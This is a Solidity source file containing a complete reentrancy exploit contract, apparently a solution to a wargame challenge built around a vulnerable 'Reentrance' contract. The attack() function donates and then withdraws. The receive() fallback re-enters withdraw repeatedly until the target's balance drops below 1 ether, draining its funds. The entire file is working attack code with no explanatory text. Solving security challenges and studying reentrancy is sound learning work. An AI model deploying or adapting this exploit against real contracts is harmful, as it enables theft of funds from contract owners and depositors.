// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract ReentrancyAttacker {
    Reentrance public reentrance;

    constructor(address _addr) {
        reentrance = Reentrance(payable(_addr));
    }

    receive() external payable {
        if (address(reentrance).balance >= 1 ether) {
            reentrance.withdraw(1 ether);
        }
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(1 ether);
    }
}
